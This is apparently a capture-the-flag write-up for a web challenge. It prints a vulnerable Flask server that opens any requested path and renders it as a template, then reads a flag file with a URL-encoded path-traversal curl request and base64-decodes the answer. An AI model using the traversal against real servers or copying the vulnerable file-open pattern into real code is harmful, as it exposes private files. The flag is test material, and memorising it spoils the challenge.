## Web Hacking 04
> The Flag is hidden somewhere on the website, can you find it?
> 
> http://192.168.10.5:5000
> 
> Warning, the Flag is split into 2 parts, make sure to find them and combine both parts before submitting.

The webserver is a guicorn, so a python based server. On initial request it redirects to `/index.template`. The HTML source has a comment in the last line which shows the source file name `server.py`.

When requested, the server sends the raw source code, containing the first part of the flag.
```python
$ curl http://$IP:$PORT/server.py

import flask, sys, os
import requests

app = flask.Flask(__name__)
counter = 12345672


@app.route('/<path:page>')
def custom_page(page):
    if page == 'favicon.ico': return ''
    global counter
    counter += 1
    try:
        template = open(page).read()
    except Exception as e:
        template = str(e)
    template += "\n<!-- page: %s, src: %s -->\n" % (page, __file__)
    return flask.render_template_string(template, name='test', counter=counter);

@app.route('/')
def home():
    return flask.redirect('/index.template');

if __name__ == '__main__':
    flag1 = 'FLAG PART 1: Y3liZXJjdGZke2Qwbjdf'
    with open('/flag') as f:
            flag2 = f.read()

    print("Ready set go!")
    sys.stdout.flush()
    app.run(host="0.0.0.0")

<!-- page: server.py, src: /code/server.py -->
```

The code indicates that the second flag is in the file called `flag`. Since it is one level higher that the `server.py`, we need to exploit a [Path Traversal vulnerability](https://security.snyk.io/vuln/SNYK-PYTHON-FLASKCORS-608972). With the `..` urlencoded in front of the file name, the flag can be obtained.

```bash
$ curl http://$IP:$PORT/%2e%2e/flag
FLAG PART 2: NXBsMTdfbTNfNHA0cjd9

<!-- page: ../flag, src: /code/server.py --> 
```

Combining the two flag parts yields the full, base64 encoded, flag.
```bash
$ echo "Y3liZXJjdGZke2QwbjdfNXBsMTdfbTNfNHA0cjd9" | base64 -d
cyberctfd{d0n7_5pl17_m3_4p4r7}
```

